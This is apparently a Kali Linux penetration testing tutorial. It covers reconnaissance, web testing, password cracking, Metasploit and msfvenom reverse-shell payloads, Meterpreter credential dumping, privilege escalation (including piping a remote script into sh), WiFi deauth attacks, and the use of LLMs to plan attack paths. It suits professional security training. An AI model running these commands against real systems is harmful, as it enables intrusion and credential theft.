Installation & Environment Setup

Kali Linux is a Debian-based distribution developed and maintained by Offensive Security, purpose-built for penetration testing, digital forensics, and security research. It ships with over 600 pre-installed security tools organised into menus by function -- information gathering, vulnerability analysis, web application analysis, password attacks, wireless attacks, reverse engineering, exploitation tools, sniffing and spoofing, post-exploitation, forensics, reporting, and social engineering. Kali is the industry standard for offensive security professionals and is used in every major penetration testing certification including OSCP, CEH, CPENT, and GPEN.

Kali can be installed as a bare-metal OS, run as a virtual machine in VirtualBox or VMware, deployed as a WSL2 subsystem on Windows, run from a live USB without installation, or pulled as a Docker container for isolated testing environments. Each deployment mode has distinct advantages depending on the engagement context.

# Download Kali: https://www.kali.org/get-kali/ # Verify ISO integrity (always verify before installing) sha256sum kali-linux-2024.1-installer-amd64.iso # Compare with official checksum at kali.org/docs/introduction/download-official-kali-linux-images/ # WSL2 install (Windows) wsl --install -d kali-linux wsl -d kali-linux # Docker (isolated testing) docker pull kalilinux/kali-rolling docker run -it --rm kalilinux/kali-rolling /bin/bash # Full system update (run after every install) sudo apt update && sudo apt full-upgrade -y sudo apt autoremove -y && sudo apt autoclean # Install meta-packages (tool bundles) sudo apt install kali-tools-top10 # Top 10 most-used tools sudo apt install kali-linux-large # Full large tool suite sudo apt install kali-tools-web # Web application testing tools sudo apt install kali-tools-wireless # Wireless attack tools sudo apt install kali-tools-forensics # Digital forensics tools # Essential configuration sudo systemctl enable ssh && sudo systemctl start ssh sudo ufw enable timedatectl set-timezone UTC # Consistent timestamps in logs # Python tooling (many tools require pip packages) sudo apt install python3-pip python3-venv pip3 install impacket bloodhound crackmapexec

Information Gathering & Reconnaissance

Information gathering is the first and most critical phase of any penetration test. The quality of reconnaissance directly determines the quality of every subsequent phase -- poor recon means missed attack surfaces and failed engagements. Kali provides a comprehensive toolkit for both passive OSINT (gathering information without touching the target) and active scanning (directly probing target systems within the authorised scope). The boundary between these must be understood and respected -- passive recon is generally always acceptable, active scanning requires written authorisation.

# NMAP -- the industry-standard network scanner # Basic host discovery (ping sweep) nmap -sn 192.168.1.0/24 # SYN scan (stealth) on top 1000 ports sudo nmap -sS 192.168.1.10 # Full comprehensive scan (the pentest favourite) sudo nmap -sS -sV -sC -O -A -p- 192.168.1.10 -oN full_scan.txt # -sS = SYN scan -sV = version detection -sC = default scripts # -O = OS fingerprint -A = aggressive -p- = all 65535 ports # Vulnerability scan with NSE scripts sudo nmap --script vuln 192.168.1.10 sudo nmap --script smb-vuln* 192.168.1.10 # All SMB vulnerability scripts sudo nmap --script http-title 192.168.1.0/24 # Grab HTTP titles across subnet # UDP scan (catches DNS, SNMP, TFTP) sudo nmap -sU --top-ports 100 192.168.1.10 # Evasion techniques (fragmented packets, decoys) sudo nmap -sS -f -D RND:10 192.168.1.10 # Fragment + 10 random decoys sudo nmap -sS --scan-delay 500ms 192.168.1.10 # Slow scan to avoid IDS # Save output in all formats sudo nmap -sV -p- 10.10.10.1 -oA results # .nmap .xml .gnmap

Web Application Testing Tools

Web application penetration testing is the most in-demand specialisation in offensive security. Kali provides a complete web testing toolkit covering manual interception with Burp Suite, automated vulnerability scanning with OWASP ZAP, SQL injection with sqlmap, directory and file brute forcing with Gobuster and ffuf, and a full suite of OWASP Top 10 exploitation tools. The standard web testing workflow starts with passive mapping via Burp proxy, moves to active directory brute forcing, then targeted automated testing for common vulnerabilities before manual exploitation.

# BURP SUITE -- the primary web app pentesting tool # Start Burp (Community Edition included in Kali) burpsuite & # Configure browser proxy: 127.0.0.1:8080 # Import Burp CA cert to browser to intercept HTTPS # OWASP ZAP -- automated scanner # Start ZAP daemon (headless for scripting) zaproxy -daemon -port 8090 -config api.disablekey=true zaproxy -cmd -autorun zap.yaml # Automated scan from YAML config # ZAP CLI quick scan zap-cli quick-scan --self-contained --spider -r http://target.com zap-cli report -o report.html -f html
# SQLMAP -- automated SQL injection detection and exploitation sqlmap -u "http://target.com/page?id=1" --dbs # Enumerate databases sqlmap -u "http://target.com/login" --data "user=a&pass=b" --dbs sqlmap -u "http://target.com/?id=1" -D mydb -T users --dump # Dump table sqlmap -u "http://target.com/?id=1" --os-shell # OS shell if possible sqlmap -r request.txt --level 5 --risk 3 # From saved Burp request # GOBUSTER -- directory, file and DNS brute forcing gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -x php,txt,html,bak gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt # FFUF -- fast web fuzzer (faster than gobuster for some tasks) ffuf -u http://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 4242 # Filter by response size ffuf -u http://target.com/login -X POST -d "user=FUZZ&pass=password" -w users.txt # NIKTO -- web server vulnerability scanner nikto -h http://target.com nikto -h http://target.com -o nikto_report.html -Format html

Password Attacks & Credential Testing

Password attacks remain one of the highest-success attack vectors in real-world penetration tests -- weak passwords, default credentials, password reuse, and insecure storage are still endemic across enterprise environments. Kali provides three primary attack approaches: online brute forcing against live services (Hydra, Medusa), offline hash cracking against captured hashes (Hashcat, John the Ripper), and credential spraying across multiple accounts with a small password list (CrackMapExec, Kerbrute). Each has distinct use cases, detection profiles, and performance characteristics.

[ ! ]

Authorised Engagements Only. Password attacks against live services generate authentication logs and may trigger account lockouts impacting production systems. Always confirm lockout policy and scope before running online brute force tools. Offline hash cracking against captured hashes has no live impact and is safe to run in your lab.

# HYDRA -- online brute force (authorised testing only) hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10 hydra -L users.txt -P passwords.txt ftp://192.168.1.10 hydra -l admin -P rockyou.txt http-post-form://target.com"/login:user=^USER^&pass=^PASS^:Invalid" hydra -l admin -P rockyou.txt -t 4 -V rdp://192.168.1.10 # RDP (4 threads) # HASHCAT -- GPU-accelerated offline hash cracking hashcat -m 0 hash.txt rockyou.txt # MD5 hashcat -m 1000 ntlm.txt rockyou.txt # NTLM (Windows) hashcat -m 1800 shadow.txt rockyou.txt # SHA512crypt (Linux) hashcat -m 2500 capture.hccapx rockyou.txt # WPA2 handshake hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule # With rules hashcat -m 1000 ntlm.txt -a 3 "?u?l?l?l?d?d?d?d" # Mask attack # JOHN THE RIPPER -- versatile hash cracker john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt unshadow /etc/passwd /etc/shadow > unshadowed.txt && john unshadowed.txt john --format=NT ntlm_hashes.txt --wordlist=rockyou.txt zip2john protected.zip > zip.hash && john zip.hash # ZIP password crack ssh2john id_rsa > rsa.hash && john rsa.hash # SSH private key crack # CRACKMAPEXEC -- network-wide credential testing (SMB/SSH/RDP) cme smb 192.168.1.0/24 -u admin -p Password123 # Password spray cme smb 192.168.1.10 -u admin -H aad3b435b51404eeaad3b435 # Pass-the-hash cme smb 192.168.1.10 -u admin -p Pass123 --sam # Dump SAM hashes

Exploitation Framework & SearchSploit

Metasploit Framework is the world's most widely used penetration testing framework, included by default in Kali. It provides a unified interface for exploit development, payload generation, post-exploitation, and reporting. SearchSploit is the offline command-line interface to Exploit-DB -- a comprehensive database of public exploits and vulnerable software -- enabling rapid exploit searching without internet access, critical during isolated network engagements. Together they form the core exploitation layer of any Kali-based penetration test.

# SEARCHSPLOIT -- offline Exploit-DB search searchsploit apache 2.4 # Search by software and version searchsploit -t "buffer overflow" linux # Search title only searchsploit -x exploits/linux/remote/46635.py # Examine exploit code searchsploit -m 46635 # Mirror exploit to current dir searchsploit --update # Update local exploit database # METASPLOIT -- core framework workflow msfconsole -q # Start (quiet mode) msf6 > search eternalblue # Search for modules msf6 > use exploit/windows/smb/ms17_010_eternalblue msf6 > info # Module details and required options msf6 > set RHOSTS 192.168.1.10 msf6 > set LHOST 10.10.14.1 msf6 > set LPORT 4444 msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp msf6 > check # Verify target is vulnerable (if supported) msf6 > run # MSFVENOM -- standalone payload generator msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o payload.elf msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f war -o shell.war # METERPRETER -- post-exploitation shell commands meterpreter > sysinfo # System info meterpreter > getuid # Current user meterpreter > getsystem # Attempt privilege escalation meterpreter > hashdump # Dump password hashes meterpreter > run post/multi/recon/local_exploit_suggester # Local privesc suggestions meterpreter > load kiwi # Load Mimikatz meterpreter > creds_all # Dump all credentials

Post-Exploitation & Privilege Escalation

Post-exploitation is the phase that separates good penetration testers from great ones. Getting initial access is step one; understanding what that access means, escalating privileges, achieving persistence, and pivoting through the network to demonstrate real business impact is where the real value of a penetration test lies. Kali provides dedicated tools for Linux and Windows privilege escalation enumeration, Active Directory attack automation, and credential extraction.

# LINPEAS -- Linux privilege escalation enumeration script # Transfer to target and run: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh # Or: python3 -m http.server 80 (on Kali), then on target: wget http://10.10.14.1/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh # WINPEAS -- Windows privilege escalation enumeration .\winPEASx64.exe quiet # Quiet mode (less verbose) .\winPEASx64.exe servicesinfo # Service-focused check # Privilege escalation checks (manual) sudo -l # What can current user sudo? find / -perm -4000 2>/dev/null # SUID binaries (GTFOBins) find / -writable -type f 2>/dev/null | grep -v proc # Writable files crontab -l && cat /etc/crontab # Scheduled tasks # BLOODHOUND -- Active Directory attack path visualisation # Collect data from compromised domain-joined host: SharpHound.exe -c All # Windows collector bloodhound-python -d domain.local -u user -p pass -c All -ns 192.168.1.1 # Python collector from Kali # Import zip to BloodHound GUI, then run pre-built queries: # "Find Shortest Paths to Domain Admins" # "Find All Domain Admins" # MIMIKATZ -- credential extraction (Windows, Meterpreter or direct) meterpreter > load kiwi meterpreter > creds_all # Dump all credential stores meterpreter > lsa_dump_sam # SAM database dump meterpreter > lsa_dump_secrets # LSA secrets # Pivoting with Metasploit (route through compromised host) meterpreter > run post/multi/manage/shell_to_meterpreter msf6 > route add 192.168.2.0/24 <session_id> msf6 > use auxiliary/server/socks_proxy msf6 > set SRVPORT 1080

Wireless Security Testing

Wireless penetration testing requires a compatible wireless adapter that supports monitor mode and packet injection (Alfa AWUS036ACH, AWUS036ACM, or similar are the standard choices). Kali includes the full Aircrack-ng suite for WPA/WPA2 handshake capture and cracking, Wifite for automated multi-target wireless attacks, and Kismet for passive wireless network discovery and logging. All wireless testing must be performed against networks you own or have explicit written authorisation to test.

# SETUP: put wireless interface into monitor mode iwconfig # List wireless interfaces sudo airmon-ng start wlan0 # Enable monitor mode # Interface is now wlan0mon # Discover nearby networks sudo airodump-ng wlan0mon # Target specific BSSID and channel, save to file sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon # Deauth attack to force handshake (sends 10 deauth frames) sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon # Crack captured WPA2 handshake aircrack-ng -w /usr/share/wordlists/rockyou.txt capture*.cap aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture.cap # GPU-accelerated crack with Hashcat (faster) hcxdumptool -o capture.pcapng -i wlan0mon hcxpcapngtool -o hash.hc22000 capture.pcapng hashcat -m 22000 hash.hc22000 rockyou.txt # WIFITE -- automated multi-target wireless attack sudo wifite # Interactive target selection sudo wifite --wpa --dict rockyou.txt # WPA targets with custom wordlist # Stop monitor mode after testing sudo airmon-ng stop wlan0mon

AI Integration in Kali Linux Operations

Artificial Intelligence is transforming how security professionals use Kali Linux -- not by replacing tool expertise, but by dramatically accelerating every stage of the workflow. AI excels at parsing and interpreting tool output (Nmap XML, Nessus reports, Burp findings), generating engagement-specific command sequences from scope parameters, explaining vulnerability findings in business language for reports, and suggesting attack paths based on discovered services. The most powerful pattern combines Kali's tool output with LLM reasoning to produce intelligence that neither could generate alone.

[ AI ]

Penetration testers using AI-assisted workflows report spending 60% less time on report writing, 40% faster tool command construction for unfamiliar attack surfaces, and significantly better vulnerability triage accuracy. LLMs bridge the gap between raw tool output and actionable security findings -- a capability that previously required years of experience to develop.

📊
Nmap Output Analysis
AI parses Nmap XML output and produces structured attack surface analysis -- identifying the highest-risk open ports, suggesting which Metasploit modules to run against detected service versions, flagging dangerous service combinations (e.g. SMB + outdated Windows version = EternalBlue candidate), and prioritising the exploitation order by likelihood of success for the specific target profile.
✏️
Command Generation
LLMs generate optimised, engagement-specific tool commands from scope parameters and discovered services. "I found Apache 2.4.49 on port 80 and OpenSSH 7.2p2 on port 22. What commands should I run?" produces the correct Metasploit module paths, searchsploit queries, Nikto flags, and sqlmap parameters -- without needing to memorise hundreds of tool options and CVE-to-module mappings.
📄
Report Writing
AI transforms raw Kali tool output into professional penetration test report findings -- converting Nmap, Nikto, Burp, and sqlmap output into structured findings with executive summary, technical description, evidence section, impact analysis, CVSSv4.0 scoring suggestion, and remediation recommendations. Reduces report writing time from days to hours for a standard engagement.
🔐
Tool Output Explanation
AI explains complex tool output to junior testers and clients -- "what does this Nmap NSE script output mean?", "why did sqlmap find this injection point vulnerable?", "what does this Burp repeater response indicate about the server's session handling?" Bridges the gap between raw tool output and security understanding, accelerating team skill development significantly.
🛠️
Custom Tool Scripting
LLMs generate custom Kali scripts that chain multiple tools together -- Python scripts that run Nmap, parse the XML, automatically run searchsploit against discovered versions, check Shodan for known exposures, and produce a prioritised attack target list. Automates the manual correlation work that consumes hours of a penetration tester's time on large-scope engagements.
🔴
Attack Path Planning
Given a network topology discovered through Nmap and BloodHound, AI suggests the optimal attack path to domain compromise -- identifying the shortest privilege escalation chain, which pivot points to use, which credentials to prioritise cracking, and which lateral movement techniques are most likely to succeed against the specific OS and service versions in scope.
